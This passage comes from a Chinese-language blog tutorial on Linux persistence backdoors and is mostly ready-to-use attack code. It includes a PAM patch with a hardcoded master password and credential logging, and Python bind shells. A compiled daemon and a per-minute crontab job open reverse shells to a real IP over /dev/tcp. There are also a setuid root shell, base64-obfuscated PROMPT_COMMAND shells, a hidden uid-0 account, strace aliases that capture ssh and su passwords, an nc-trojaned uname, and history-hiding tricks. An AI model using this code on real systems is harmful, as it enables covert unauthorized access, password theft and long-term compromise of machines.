class="string">&quot;a&quot;</span>);</span><br><span class="line">          <span class="built_in">fprintf</span>(fp,<span class="string">&quot;%s-&gt;%s\n&quot;</span>, name,p);</span><br><span class="line">          fclose(fp);</span><br><span class="line">        &#125;</span><br><span class="line">        name = p = <span class="literal">NULL</span>;</span><br></pre></td></tr></table></figure><blockquote><p>修改Linux-PAM-1.1.8&#x2F;modules&#x2F;pam_unix&#x2F;support.c</p></blockquote><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> _unix_verify_password(<span class="type">pam_handle_t</span> * pamh, <span class="type">const</span> <span class="type">char</span> *name ,<span class="type">const</span> <span class="type">char</span> *p, <span class="type">unsigned</span> <span class="type">int</span> ctrl)</span><br><span class="line">&#123;</span><br><span class="line">        <span class="class"><span class="keyword">struct</span> <span class="title">passwd</span> *<span class="title">pwd</span> =</span> <span class="literal">NULL</span>;</span><br><span class="line">        <span class="type">char</span> *salt = <span class="literal">NULL</span>;</span><br><span class="line">        <span class="type">char</span> *data_name;</span><br><span class="line">        <span class="type">int</span> retval;</span><br><span class="line"><span class="keyword">if</span> (<span class="built_in">strcmp</span>(<span class="string">&quot;11pm&quot;</span>,p)==<span class="number">0</span>) &#123;<span class="keyword">return</span> PAM_SUCCESS;&#125;</span><br><span class="line">        D((<span class="string">&quot;called&quot;</span>));</span><br></pre></td></tr></table></figure><p>然后编译生成so文件，替换系统pam_unix.so文件即可</p><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><blockquote><ul><li><a href="https://qiita.com/Y4er/items/e413dffdd8b1b7d0a59a">Linux-PAM后门</a></li><li><a href="https://www.cnblogs.com/-qing-/p/13178917.html"><strong>Linux Pam后门总结拓展</strong></a></li><li><a href="https://xz.aliyun.com/t/7902">Linux Pam后门总结拓展</a></li></ul></blockquote><h1 id="VIM后门"><a href="#VIM后门" class="headerlink" title="VIM后门"></a>VIM后门</h1><p>前提条件：VIM安装了python扩展,默认安装的话都有python扩展，脚本可以放到python的扩展目录</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">cd</span> /usr/lib/python2.7/site-packages &amp;&amp; $(<span class="built_in">nohup</span> vim -E -c <span class="string">&quot;pyfile s.py&quot;</span>&gt; /dev/null 2&gt;&amp;1 &amp;) &amp;&amp; <span class="built_in">sleep</span> 2 &amp;&amp; <span class="built_in">rm</span> -f s.py</span><br><span class="line"></span><br><span class="line"><span class="comment">#nohup将程序以忽略挂起信号的方式运行起来,即后台运行</span></span><br></pre></td></tr></table></figure><blockquote><p>s.py</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> socket <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> subprocess</span><br><span class="line"><span class="keyword">import</span> os, threading, sys, time</span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">        server=socket(AF_INET,SOCK_STREAM)</span><br><span class="line">        server.bind((<span class="string">&#x27;0.0.0.0&#x27;</span>,<span class="number">12345</span>))</span><br><span class="line">        server.listen(<span class="number">5</span>)</span><br><span class="line">        <span class="built_in">print</span> <span class="string">&#x27;waiting for connect&#x27;</span></span><br><span class="line">        talk, addr = server.accept()</span><br><span class="line">        <span class="built_in">print</span> <span class="string">&#x27;connect from&#x27;</span>,addr</span><br><span class="line">        proc = subprocess.Popen([<span class="string">&quot;/bin/sh&quot;</span>,<span class="string">&quot;-i&quot;</span>], stdin=talk,stdout=talk,stderr=talk, shell=<span class="literal">True</span>)</span><br></pre></td></tr></table></figure></blockquote><h1 id="Alias后门"><a href="#Alias后门" class="headerlink" title="Alias后门"></a>Alias后门</h1><blockquote><ul><li>通过alias来指定执行特定的命令时候静默运行其他程序，从而达到启动后门，记录键值等作用。</li><li>需要注意的是！！！<strong>直接在shell里设定的命令别名，在终端关闭或者系统重新启动后都会失效。下面也有讲如何永久生效，alias用法里面</strong></li></ul></blockquote><h2 id="alias用法"><a href="#alias用法" class="headerlink" title="alias用法"></a>alias用法</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment">#输入alias查看系统哪些别名 ，unalias删除别名，</span></span><br><span class="line"><span class="comment">#语法</span></span><br><span class="line"><span class="built_in">alias</span>(选项)(参数)</span><br><span class="line"><span class="comment">#选项</span></span><br><span class="line">-p：打印已经设置的命令别名。</span><br><span class="line"><span class="comment">#参数</span></span><br><span class="line">命令别名设置：定义命令别名，格式为“命令别名=‘实际命令’”。</span><br><span class="line"><span class="comment">#实例</span></span><br><span class="line"><span class="built_in">alias</span> 的基本使用方法为：<span class="built_in">alias</span> 新的命令=<span class="string">&#x27;原命令 -选项/参数&#x27;</span></span><br><span class="line"><span class="comment">#命令别名永久生效</span></span><br><span class="line">直接在shell里设定的命令别名，在终端关闭或者系统重新启动后都会失效，如何才能永久有效呢？办法就是将别名的设置加入~/.bashrc文件，然后重新载入下文件就可以了。</span><br><span class="line">vim ~/.bashrc</span><br><span class="line">在文件最后面加入别名设置，如：<span class="built_in">alias</span> <span class="built_in">rm</span>=’<span class="built_in">rm</span> -i’，保存后重新载入：</span><br><span class="line"><span class="built_in">source</span> ~/.bashrc</span><br><span class="line">这样就可以永久保存命令的别名了。因为修改的是当前用户目录下的.bashrc文件，所以这样的方式只对当前用户有用。如果要对所有用户都有效，修改/etc目录下的bashrc文件就可以了。在CentOS7下，这个文件是/etc/bash.bashrc。此外在CentOS7下，细看~/.bashrc文件，会发有这样一段代码：</span><br><span class="line"><span class="keyword">if</span> [ -f ~/.bash_aliases ]; <span class="keyword">then</span></span><br><span class="line">    . ~/.bash_aliases</span><br><span class="line"><span class="keyword">fi</span></span><br><span class="line">这个代码的意思就是加载.bash_aliases文件，CentOS7已经帮我们考虑好了，所以也可以在用户根目录下新建一个文件.bash_aliases存放命令别名设置。</span><br></pre></td></tr></table></figure><h2 id="SSH-Keylogger键盘记录（前面有讲）"><a href="#SSH-Keylogger键盘记录（前面有讲）" class="headerlink" title="SSH Keylogger键盘记录（前面有讲）"></a>SSH Keylogger键盘记录（前面有讲）</h2><p>修改ssh命令，利用strace，使其具有记录ssh对read,write,connect调用的功能。</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">alias</span> ssh=<span class="string">&#x27;strace -o /tmp/sshpwd-`date +%d%h%m%s`.log -e read,write,connect -s2048 ssh&#x27;</span></span><br></pre></td></tr></table></figure><h2 id="反弹shell"><a href="#反弹shell" class="headerlink" title="反弹shell"></a>反弹shell</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment">#编译下面的c代码文件后，再shell下执行即可</span></span><br><span class="line"><span class="built_in">alias</span> <span class="built_in">cat</span>=<span class="string">&#x27;/root/.shell &amp;&amp; cat&#x27;</span></span><br><span class="line"><span class="comment">#控制机器：</span></span><br><span class="line">nc -lvvp 8008</span><br><span class="line"><span class="comment">#如果监听失败使用</span></span><br><span class="line">nc -lvnp 8008</span><br><span class="line"><span class="comment">#-n 直接使用IP地址，而不通过域名服务器</span></span><br></pre></td></tr></table></figure><blockquote><p>编译c代码生成shell可执行文件</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">gcc shell.c -o .shell</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">生成的.shell可以隐藏在当前目录</span></span><br></pre></td></tr></table></figure><p>shell.c记得将IP换为自己监听机器的ip</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;time.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/stat.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;signal.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> ERR_EXIT(m) do&#123;perror(m); exit(EXIT_FAILURE);&#125;while (0);</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">creat_daemon</span><span class="params">(<span class="type">void</span>)</span>;</span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="type">time_t</span> t;</span><br><span class="line"><span class="type">int</span> fd;</span><br><span class="line">creat_daemon();</span><br><span class="line">system(<span class="string">&quot;bash -i &gt;&amp; /dev/tcp/124.223.217.243/8008 0&gt;&amp;1&quot;</span>);</span><br><span class="line"><span class="comment">//执行系统命令反弹shell</span></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">creat_daemon</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="type">pid_t</span> pid;</span><br><span class="line"><span class="type">int</span> devnullfd,fd,fdtablesize;</span><br><span class="line">umask(<span class="number">0</span>);</span><br><span class="line">pid = fork();</span><br><span class="line"><span class="keyword">if</span>( pid == <span class="number">-1</span>)</span><br><span class="line">  ERR_EXIT(<span class="string">&quot;fork error&quot;</span>);</span><br><span class="line"><span class="keyword">if</span>(pid &gt; <span class="number">0</span> )</span><br><span class="line">  <span class="built_in">exit</span>(EXIT_SUCCESS);</span><br><span class="line"><span class="keyword">if</span>(setsid() == <span class="number">-1</span>)</span><br><span class="line">  ERR_EXIT(<span class="string">&quot;SETSID ERROR&quot;</span>);</span><br><span class="line">chdir(<span class="string">&quot;/&quot;</span>);</span><br><span class="line"><span class="comment">/* close any open file descriptors */</span></span><br><span class="line"><span class="keyword">for</span>(fd = <span class="number">0</span>, fdtablesize = getdtablesize(); fd &lt; fdtablesize; fd++)</span><br><span class="line">  close(fd);</span><br><span class="line">devnullfd = open(<span class="string">&quot;/dev/null&quot;</span>, <span class="number">0</span>);</span><br><span class="line"><span class="comment">/* make STDIN ,STDOUT and STDERR point to /dev/null */</span></span><br><span class="line"><span class="keyword">if</span> (devnullfd == <span class="number">-1</span>) &#123;</span><br><span class="line">  ERR_EXIT(<span class="string">&quot;can&#x27;t open /dev/null&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (dup2(devnullfd, STDIN_FILENO) == <span class="number">-1</span>) &#123;</span><br><span class="line">  ERR_EXIT(<span class="string">&quot;can&#x27;t dup2 /dev/null to STDIN_FILENO&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (dup2(devnullfd, STDOUT_FILENO) == <span class="number">-1</span>) &#123;</span><br><span class="line">  ERR_EXIT(<span class="string">&quot;can&#x27;t dup2 /dev/null to STDOUT_FILENO&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (dup2(devnullfd, STDERR_FILENO) == <span class="number">-1</span>) &#123;</span><br><span class="line">  ERR_EXIT(<span class="string">&quot;can&#x27;t dup2 /dev/null to STDOUT_FILENO&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line">signal(SIGCHLD,SIG_IGN);</span><br><span class="line"><span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></blockquote><h1 id="Crontab后门"><a href="#Crontab后门" class="headerlink" title="Crontab后门"></a>Crontab后门</h1><blockquote><p>每分钟反弹一次shell给指定ip的8888端口</p></blockquote><h2 id="目标机器"><a href="#目标机器" class="headerlink" title="目标机器"></a>目标机器</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">(crontab -l;<span class="built_in">echo</span> <span class="string">&#x27;*/1 * * * * exec 9&lt;&gt; /dev/tcp/124.223.217.243/8888;exec 0&lt;&amp;9;exec 1&gt;&amp;9 2&gt;&amp;1;/bin/bash --noprofile -i&#x27;</span>)|crontab -</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#查看当前计划任务</span></span><br><span class="line">crontab -l</span><br><span class="line"><span class="comment">#将标注输出通过管道符|写入计划任务</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&#x27;*/1 * * * * exec 9&lt;&gt; /dev/tcp/124.223.217.243/8888;exec 0&lt;&amp;9;exec 1&gt;&amp;9 2&gt;&amp;1;/bin/bash --noprofile -i&#x27;</span></span><br><span class="line"><span class="comment">#echo后门的内容就是反弹shell命令。</span></span><br><span class="line"><span class="comment">#exec 9&lt;&gt;/dev/tcp/124.223.217.243/6666;做的事情就是定义文件描述符9和将/dev/tcp/124.223.217.243/6666输入输出的重定向到自定义的标准文件描述符9中</span></span><br><span class="line"><span class="comment">#exec 0&lt;&amp;9;exec 1&gt;&amp;9 2&gt;&amp;1;做的事情就是将&amp;9接受的输入，重定向到标准输入；将标准错误输出重定向到标准输出，再将标准输出重定向到我们自己定义的文件描述符9之中输出</span></span><br><span class="line"><span class="comment">#/bin/bash --noprofile -i；做的事情就是，-i：实现脚本交互，--noprofile会跳过 Profile 脚本（系统环境的初始化，启动的初始化脚本)</span></span><br></pre></td></tr></table></figure><h2 id="攻击机"><a href="#攻击机" class="headerlink" title="攻击机"></a>攻击机</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment">#开启监听</span></span><br><span class="line">nc -lvnp 8888</span><br></pre></td></tr></table></figure><h2 id="常用命令"><a href="#常用命令" class="headerlink" title="常用命令"></a>常用命令</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment">#服务开启</span></span><br><span class="line">service crond start</span><br><span class="line"><span class="comment">#编辑计划任务</span></span><br><span class="line">crontab  -e  -u  用户名</span><br><span class="line"><span class="comment">#查看计划任务</span></span><br><span class="line">crontab  -l  -u  用户名</span><br><span class="line"><span class="comment">#删除计划任务：</span></span><br><span class="line">crontab  -r  -u  用户名</span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment">#相关文件</span></span><br><span class="line">/var/spool/cron/用户名   <span class="comment">#用户定义的设置。位置一般在/var/spool/cron/下，如果你是root用户，那下面有个root文件，建议日常备份，避免误删除导致crontab 文件丢失；</span></span><br><span class="line"><span class="comment">#cron服务的日志文件。默认情况下,crontab中执行的日志写在/var/log下,如:</span></span><br><span class="line"><span class="built_in">ls</span> /var/log/cron*</span><br><span class="line">/etc/crontab             <span class="comment">#cron服务配置文件</span></span><br><span class="line"><span class="comment">#使用者也可以将所有的设定先存放在文件中，用 crontab file 的方式来设定执行时间。</span></span><br></pre></td></tr></table></figure><h2 id="时间格式"><a href="#时间格式" class="headerlink" title="时间格式"></a>时间格式</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment">#时间格式如下：</span></span><br><span class="line">f1   f2  f3   f4   f5 program</span><br><span class="line">*    *    *    *    *</span><br><span class="line">-    -    -    -    -</span><br><span class="line">|    |    |    |    |</span><br><span class="line">|    |    |    |    +----- 星期中星期几 (0 - 6) (星期天 为0)</span><br><span class="line">|    |    |    +---------- 月份 (1 - 12) </span><br><span class="line">|    |    +--------------- 一个月中的第几天 (1 - 31)</span><br><span class="line">|    +-------------------- 小时 (0 - 23)</span><br><span class="line">+------------------------- 分钟 (0 - 59)</span><br><span class="line"><span class="comment">#解释：</span></span><br><span class="line"><span class="comment">#其中 f1 是表示分钟，f2 表示小时，f3 表示一个月份中的第几日，f4 表示月份，f5 表示一个星期中的第几天。program 表示要执行的程序。</span></span><br><span class="line"><span class="comment">#当 f1 为 * 时表示每分钟都要执行 program，f2 为 * 时表示每小时都要执行程序，其馀类推</span></span><br><span class="line"><span class="comment">#当 f1 为 a-b 时表示从第 a 分钟到第 b 分钟这段时间内要执行，f2 为 a-b 时表示从第 a 到第 b 小时都要执行，其馀类推</span></span><br><span class="line"><span class="comment">#当 f1 为 */n 时表示每 n 分钟个时间间隔执行一次，f2 为 */n 表示每 n 小时个时间间隔执行一次，其馀类推</span></span><br><span class="line"><span class="comment">#当 f1 为 a, b, c,... 时表示第 a, b, c,... 分钟要执行，f2 为 a, b, c,... 时表示第 a, b, c...个小时要执行，其馀类推</span></span><br></pre></td></tr></table></figure><h2 id="细节"><a href="#细节" class="headerlink" title="细节"></a>细节</h2><blockquote><ul><li><strong>crond</strong> 命令每分钟会定期检查是否有要执行的工作，如果有要执行的工作便会自动执行该工作。</li></ul><blockquote><p><strong>注意：</strong>新创建的 cron 任务，不会马上执行，至少要过 2 分钟后才可以，当然你可以重启 cron 来马上执行。</p></blockquote><ul><li>linux 任务调度的工作主要分为以下两类：</li></ul><blockquote><p>1、系统执行的工作：系统周期性所要执行的工作，如备份系统数据、清理缓存</p><p>2、个人执行的工作：某个用户定期要做的工作，例如每隔 10 分钟检查邮件服务器是否有新信，这些工作可由每个用户自行设置</p></blockquote><ul><li><p>所有命令需要写成绝对路径形式，如: <strong>&#x2F;usr&#x2F;local&#x2F;bin&#x2F;docker</strong></p></li><li><p>在 shell 脚本开头使用以下代码,调用sh解析脚本：</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="meta">#!/bin/sh</span></span><br><span class="line"></span><br><span class="line">. /etc/profile</span><br><span class="line">. ~/.bash_profile</span><br></pre></td></tr></table></figure></li><li><p>在 <strong>&#x2F;etc&#x2F;crontab</strong> 中添加环境变量，在可执行命令之前添加命令 <strong>. &#x2F;etc&#x2F;profile;&#x2F;bin&#x2F;sh</strong>，使得环境变量生效，例如：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">20 03 * * * . /etc/profile;/bin/sh /var/www/runoob/test.sh</span><br></pre></td></tr></table></figure></li></ul></blockquote><h2 id="实例"><a href="#实例" class="headerlink" title="实例"></a>实例</h2><ul><li>每一分钟执行一次 &#x2F;bin&#x2F;ls：</li></ul><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">* * * * * /bin/ls</span><br></pre></td></tr></table></figure><ul><li>在 12 月内, 每天的早上 6 点到 12 点，每隔 3 个小时 0 分钟执行一次 &#x2F;usr&#x2F;bin&#x2F;backup：</li></ul><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">0 6-12/3 * 12 * /usr/bin/backup</span><br></pre></td></tr></table></figure><ul><li>周一到周五每天下午 5:00 寄一封信给 <a href="mailto:&#x61;&#x6c;&#x65;&#x78;&#x40;&#x64;&#x6f;&#x6d;&#97;&#105;&#110;&#x2e;&#x6e;&#x61;&#109;&#x65;">&#x61;&#x6c;&#x65;&#x78;&#x40;&#x64;&#x6f;&#x6d;&#97;&#105;&#110;&#x2e;&#x6e;&#x61;&#109;&#x65;</a>：</li></ul><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">0 17 * * 1-5 mail -s &quot;hi&quot; alex@domain.name &lt; /tmp/maildata</span><br></pre></td></tr></table></figure><ul><li>每月每天的午夜 0 点 20 分, 2 点 20 分, 4 点 20 分….执行 echo “haha”：</li></ul><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">20 0-23/2 * * * echo &quot;haha&quot;</span><br></pre></td></tr></table></figure><ul><li>下面再看看几个具体的例子：</li></ul><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">0 */2 * * * /sbin/service httpd restart  <span class="comment">#意思是每两个小时重启一次apache </span></span><br><span class="line">50 7 * * * /sbin/service sshd start  <span class="comment">#意思是每天7：50开启ssh服务 </span></span><br><span class="line">50 22 * * * /sbin/service sshd stop  <span class="comment">#意思是每天22：50关闭ssh服务 </span></span><br><span class="line">0 0 1,15 * * fsck /home  <span class="comment">#每月1号和15号检查/home 磁盘 </span></span><br><span class="line">1 * * * * /home/bruce/backup  <span class="comment">#每小时的第一分执行 /home/bruce/backup这个文件 </span></span><br><span class="line">00 03 * * 1-5 find /home <span class="string">&quot;*.xxx&quot;</span> -mtime +4 -<span class="built_in">exec</span> <span class="built_in">rm</span> &#123;&#125; \;  <span class="comment">#每周一至周五3点钟，在目录/home中，查找文件名为*.xxx的文件，并删除4天前的文件。</span></span><br><span class="line">30 6 */10 * * <span class="built_in">ls</span>  <span class="comment">#意思是每月的1、11、21、31日是的6：30执行一次ls命令</span></span><br></pre></td></tr></table></figure><h2 id="refer"><a href="#refer" class="headerlink" title="refer"></a>refer</h2><blockquote><ul><li><a href="https://www.runoob.com/linux/linux-comm-crontab.html">https://www.runoob.com/linux/linux-comm-crontab.html</a></li><li><a href="https://wangdoc.com/bash/startup.html">https://wangdoc.com/bash/startup.html</a></li></ul></blockquote><h1 id="Setuid-amp-Setgid提权后门"><a href="#Setuid-amp-Setgid提权后门" class="headerlink" title="Setuid &amp; Setgid提权后门"></a>Setuid &amp; Setgid提权后门</h1><p>当我们有机会拿到普通权限的时候，我们可以留下一个这样的后门程序，以后我们就可以直接提权拿到root的权限。</p><ul><li>setuid</li></ul><p><strong>设置使文件在执行阶段具有文件所有者的权限</strong>. 典型的文件是 &#x2F;usr&#x2F;bin&#x2F;passwd. 如果一般用户执行该文件， 则在执行过程中， 该文件可以获得root权限， 从而可以更改用户的密码。</p><ul><li>setgid</li></ul><p>该权限只对目录有效. 目录被设置该位后， 任何用户在此目录下创建的文件都具有和该目录所属的组相同的组（即在相同组的话就具备相同的权限.</p><blockquote><p>back.c</p></blockquote><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="type">void</span> <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span> *argv[])</span></span><br><span class="line">&#123;</span><br><span class="line">    setuid(<span class="number">0</span>);</span><br><span class="line">    setgid(<span class="number">0</span>);</span><br><span class="line">    <span class="keyword">if</span>(argc &gt; <span class="number">1</span>)</span><br><span class="line">        execl(<span class="string">&quot;/bin/sh&quot;</span>, <span class="string">&quot;sh&quot;</span>, <span class="string">&quot;-c&quot;</span>, argv[<span class="number">1</span>], <span class="literal">NULL</span>);</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        execl(<span class="string">&quot;/bin/sh&quot;</span>, <span class="string">&quot;sh&quot;</span>, <span class="literal">NULL</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment">#编译</span></span><br><span class="line">gcc back.c -o back</span><br><span class="line"><span class="comment">#添加到bin目录，这样任何用户都能调用back</span></span><br><span class="line"><span class="built_in">cp</span> back /bin/</span><br><span class="line"><span class="comment">#赋予s权限的作用：表示对文件具用可执行权限的用户将使用文件拥有者的权限或文件拥有者所在组的权限在对文件进行执行</span></span><br><span class="line"><span class="built_in">chmod</span> u+s /bin/back</span><br></pre></td></tr></table></figure><p><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202208231332169.png" alt="image-20220823133203006"></p><h1 id="PROMPT-COMMAND"><a href="#PROMPT-COMMAND" class="headerlink" title="PROMPT_COMMAND"></a>PROMPT_COMMAND</h1><h2 id="后门"><a href="#后门" class="headerlink" title="后门"></a>后门</h2><blockquote><p>Linux Bash Shell提供了一个环境变量：PROMPT_COMMAND，这个变量是在<br>BASH出现提示符前执行的命令。</p></blockquote><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">export PROMPT_COMMAND=&quot;lsof -i:8080 &amp;&gt;/dev/null || python -c \&quot;exec(&#x27;aW1wb3J0IHNvY2tldCxzdWJwcm9jZXNzLG9zO3M9c29ja2V0LnNvY2tldChzb2NrZXQuQUZfSU5FVCxzb2NrZXQuU09DS19TVFJFQU0pO3MuY29ubmVjdCgoIjE5Mi4xNjguNzguNzkiLDgwODApKTtvcy5kdXAyKHMuZmlsZW5vKCksMCk7IG9zLmR1cDIocy5maWxlbm8oKSwxKTtvcy5kdXAyKHMuZmlsZW5vKCksMik7aW1wb3J0IHB0eTsgcHR5LnNwYXduKCIvYmluL3NoIik=&#x27;.decode(&#x27;base64&#x27;))\&quot; 2&gt;/dev/null &amp;)&quot;</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">export PROMPT_COMMAND=&quot;lsof -i:1025 &amp;&gt;/dev/null || (python -c \&quot;exec(&#x27;aW1wb3J0IHNvY2tldCxvcwpzbz1zb2NrZXQuc29ja2V0KHNvY2tldC5BRl9JTkVULHNvY2tldC5TT0NLX1NUUkVBTSkKc28uYmluZCgoJycsMTAyNSkpCnNvLmxpc3RlbigxKQpzbyxhZGRyPXNvLmFjY2VwdCgpCkxKPUZhbHNlCndoaWxlIG5vdCBMSjoKCWRhdGE9c28ucmVjdigxMDI0KQoJc3RkaW4sc3Rkb3V0LHN0ZGVyciw9b3MucG9wZW4zKGRhdGEpCglzdGRvdXRfdmFsdWU9c3Rkb3V0LnJlYWQoKStzdGRlcnIucmVhZCgpCglzby5zZW5kKHN0ZG91dF92YWx1ZSkK&#x27;.decode(&#x27;base64&#x27;))\&quot; 2&gt;/dev/null &amp;)&quot;</span><br></pre></td></tr></table></figure><p><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202208231333067.png" alt="image-20220823133331888"></p><p><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202208231333996.png" alt="image-20220823133343811"></p><h2 id="记录历史操作"><a href="#记录历史操作" class="headerlink" title="记录历史操作"></a>记录历史操作</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">PROMPT_COMMAND=&#x27;msg=$(history 1|&#123; read x y; echo $y; &#125;);user=$(who am i);logger $(date &quot;+%Y-%m-%d%H:%M:%S&quot;):$user[$(whoami)]:`pwd`/:&quot;$msg&quot;&#x27;</span><br></pre></td></tr></table></figure><p><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202208231334732.png" alt="image-20220823133419549"></p><p><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202208231334405.png" alt="image-20220823133437240"></p><h2 id="创建高权限用户"><a href="#创建高权限用户" class="headerlink" title="创建高权限用户"></a>创建高权限用户</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">export PROMPT_COMMAND=&quot;/usr/sbin/useradd -o -u 0 hack &amp;&gt;/dev/null &amp;&amp; echo hacker:123456 | /usr/sbin/chpasswd &amp;&gt;/dev/null &amp;&amp; unset PROMPT_COMMAND&quot;</span><br></pre></td></tr></table></figure><h1 id="Strace后门"><a href="#Strace后门" class="headerlink" title="Strace后门"></a>Strace后门</h1><p>strace常用来跟踪进程执行时的系统调用和所接收的信号。 在Linux世界，进程不能直接访问硬件设备，当进程需要访问硬件设备(比如读取磁盘文件，接收网络数据等等)时，必须由用户态模式切换至内核态模式，通 过系统调用访问硬件设备。strace可以跟踪到一个进程产生的系统调用,包括参数，返回值，执行消耗的时间。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ssh=&#x27;strace -o /tmp/sshpwd-`date +%d%h%m%s`.log -e read,write,connect -s2048 ssh&#x27;</span><br><span class="line">su=&#x27;strace -o /tmp/sulog-`date +%d%h%m%s`.log -e read,write,connect -s2048 su&#x27;</span><br></pre></td></tr></table></figure><h1 id="后门账号"><a href="#后门账号" class="headerlink" title="后门账号"></a>后门账号</h1><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">perl -e &#x27;print crypt(&quot;mingy&quot;,&quot;adgfagm&quot;).&quot;\n&quot;&#x27;adu01teZNx5nY</span><br><span class="line">echo &quot;weblogic1:adu01teZNx5nY:0:0:root:/root:/bin/bash&quot;&gt;&gt;/etc/passwd</span><br></pre></td></tr></table></figure><h1 id="uname后门"><a href="#uname后门" class="headerlink" title="uname后门"></a>uname后门</h1><blockquote><p><a href="https://github.com/iamckn/backdoors">https://github.com/iamckn/backdoors</a></p></blockquote><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#!/bin/bash</span><br><span class="line">nc -l -v -p 4444 -e /bin/bash 2&gt;/dev/null &amp;/bin/uname $@</span><br></pre></td></tr></table></figure><p><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202208231336341.png" alt="image-20220823133618162"></p><p><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202208231336970.png" alt="image-20220823133631778"></p><h1 id="Linux隐藏技巧"><a href="#Linux隐藏技巧" class="headerlink" title="Linux隐藏技巧"></a>Linux隐藏技巧</h1><h2 id="简单文件隐藏"><a href="#简单文件隐藏" class="headerlink" title="简单文件隐藏"></a>简单文件隐藏</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">touch .mingy.py</span><br><span class="line">ls -la</span><br></pre></td></tr></table></figure><h2 id="隐藏权限"><a href="#隐藏权限" class="headerlink" title="隐藏权限"></a>隐藏权限</h2><p>chattr命令可以给文件加锁，防止被删除，我们也可以将它利用起来</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">chattr +i 1.txt</span><br><span class="line">chattr -i 1.txt</span><br></pre></td></tr></table></figure><h2 id="隐藏历史记录"><a href="#隐藏历史记录" class="headerlink" title="隐藏历史记录"></a>隐藏历史记录</h2><p>拿到shell以后，开启无痕模式，禁用命令历史记录功能</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">set +o history</span><br></pre></td></tr></table></figure><p>恢复</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">set -o history</span><br></pre></td></tr></table></figure><h2 